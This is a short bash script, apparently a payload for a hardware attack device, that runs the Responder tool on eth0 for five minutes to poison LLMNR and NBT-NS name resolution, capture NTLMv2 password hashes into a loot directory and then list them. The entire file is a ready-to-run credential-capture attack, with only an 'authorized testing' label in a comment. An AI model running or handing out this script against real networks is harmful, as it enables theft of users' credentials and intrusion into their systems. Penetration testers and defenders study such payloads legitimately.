#!/bin/bash
# Responder - LLMNR/NBT-NS Poisoning
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY
# HIGH DETECTABILITY

LED ATTACK

echo "[!] Responder Attack - LLMNR/NBT-NS Poisoning"
echo "[*] HIGH DETECTABILITY"
echo "[*] Capturing NTLMv2 hashes..."

mkdir -p /root/loot/responder

# Run responder for 5 minutes
cd /root/loot/responder
timeout 300 responder -I eth0 -wrf

LED FINISH

echo "[+] Attack complete"
echo "[*] Check /root/loot/responder/ for captured hashes"
ls -la /root/loot/responder/
